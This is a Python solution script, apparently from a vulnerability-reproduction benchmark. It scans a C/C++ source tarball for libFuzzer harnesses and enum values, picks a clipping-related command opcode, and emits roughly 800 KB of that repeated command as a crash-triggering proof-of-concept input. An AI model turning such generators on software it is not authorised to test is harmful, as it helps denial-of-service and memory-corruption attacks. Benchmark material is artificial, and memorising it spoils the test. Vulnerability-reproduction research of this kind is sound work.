import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        def parse_enums_from_source(text: str, enum_map: dict) -> None:
            pos = 0
            while True:
                idx = text.find('enum', pos)
                if idx == -1:
                    break
                if idx > 0 and (text[idx - 1].isalnum() or text[idx - 1] == '_'):
                    pos = idx + 4
                    continue
                brace = text.find('{', idx)
                if brace == -1:
                    break
                end = text.find('};', brace)
                if end == -1:
                    break
                body = text[brace + 1:end]
                body = re.sub(r'/\*.*?\*/', '', body, flags=re.S)
                current_val = 0
                for part in body.split(','):
                    line = part.strip()
                    if not line:
                        continue
                    line = re.sub(r'//.*', '', line).strip()
                    if not line:
                        continue
                    m = re.match(r'([A-Za-z_]\w*)\s*(?:=\s*([^,]+))?$', line)
                    if not m:
                        continue
                    name = m.group(1)
                    value_expr = m.group(2)
                    if value_expr:
                        expr = value_expr.strip()
                        expr = re.sub(r'//.*', '', expr).strip()
                        if not expr:
                            pass
                        else:
                            expr_simple = re.split(r'\s', expr)[0]
                            expr_simple = re.sub(r'[uUlL]+$', '', expr_simple)
                            if re.fullmatch(r'[-+]?0[xX][0-9a-fA-F]+', expr_simple) or re.fullmatch(r'[-+]?\d+', expr_simple):
                                try:
                                    current_val = int(expr_simple, 0)
                                except Exception:
                                    pass
                    if name not in enum_map:
                        enum_map[name] = current_val
                    current_val += 1
                pos = end + 2

        enum_map: dict = {}
        harnesses = []

        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for member in tf.getmembers():
                    if not member.isfile():
                        continue
                    name = member.name
                    lower = name.lower()
                    if lower.endswith(('.h', '.hpp', '.hh', '.hxx', '.c', '.cc', '.cpp', '.cxx')):
                        if member.size > 1500000:
                            continue
                        f = tf.extractfile(member)
                        if f is None:
                            continue
                        try:
                            data = f.read()
                        except Exception:
                            continue
                        try:
                            text = data.decode('utf-8', 'ignore')
                        except Exception:
                            continue
                        parse_enums_from_source(text, enum_map)
                        if 'LLVMFuzzerTestOneInput' in text:
                            harnesses.append((name, text))
        except Exception:
            return b'C' * 100

        if not harnesses:
            return b'D' * 100

        def harness_score(item) -> int:
            _name, text = item
            t = text.lower()
            score = 0
            score += t.count('clip') * 5
            score += t.count('layer') * 2
            score += t.count('blcontext') * 4
            score += t.count('blend2d') * 3
            score += t.count('skia') * 1
            score += t.count('canvas') * 1
            return score

        harness_name, harness_text = max(harnesses, key=harness_score)

        def extract_fuzz_body(text: str) -> str:
            idx = text.find('LLVMFuzzerTestOneInput')
            if idx == -1:
                return text
            brace = text.find('{', idx)
            if brace == -1:
                return text[idx:]
            level = 1
            i = brace + 1
            n = len(text)
            while i < n and level > 0:
                ch = text[i]
                if ch == '{':
                    level += 1
                elif ch == '}':
                    level -= 1
                i += 1
            if level == 0:
                return text[brace + 1:i - 1]
            else:
                return text[brace + 1:]

        body = extract_fuzz_body(harness_text)

        def parse_case_value(token: str, enum_map_local: dict):
            t = token.strip()
            if not t:
                return None
            while t.startswith('(') and t.endswith(')') and len(t) > 2:
                t = t[1:-1].strip()
            t = t.split('//')[0].strip()
            if not t:
                return None
            if t.startswith("'") and t.endswith("'") and len(t) >= 3:
                return ord(t[1])
            t_simple = re.sub(r'[uUlL]+$', '', t)
            if re.fullmatch(r'[-+]?0[xX][0-9a-fA-F]+', t_simple) or re.fullmatch(r'[-+]?\d+', t_simple):
                try:
                    return int(t_simple, 0)
                except Exception:
                    return None
            ident = t_simple.split('::')[-1]
            return enum_map_local.get(ident)

        def find_clip_cases(body_text: str, enum_map_local: dict):
            clip_cases_local = set()
            current_cases_local = []
            for line in body_text.splitlines():
                s = line.strip()
                if not s:
                    continue
                if s.startswith('case '):
                    pos = s.find(':')
                    if pos == -1:
                        continue
                    token = s[len('case '):pos].strip()
                    val = parse_case_value(token, enum_map_local)
                    if val is not None:
                        current_cases_local = [val]
                    else:
                        current_cases_local = []
                    continue
                if s.startswith('default:'):
                    current_cases_local = []
                    continue
                if current_cases_local and ('clip' in s.lower() or 'clipping' in s.lower()):
                    for v in current_cases_local:
                        clip_cases_local.add(v)
                if s.startswith('break') or s.startswith('return'):
                    current_cases_local = []
            return clip_cases_local

        clip_cases = find_clip_cases(body, enum_map)

        if not clip_cases:
            return b'E' * 100

        op_val = min(clip_cases)
        opcode_byte = op_val & 0xFF

        param_bytes = 64
        per_cmd = 1 + param_bytes
        desired_size = 800000
        num_cmds = max(1, desired_size // per_cmd)

        pattern = bytes([opcode_byte]) + b'\x00' * param_bytes
        data = pattern * num_cmds

        if not data:
            data = bytes([opcode_byte])

        return data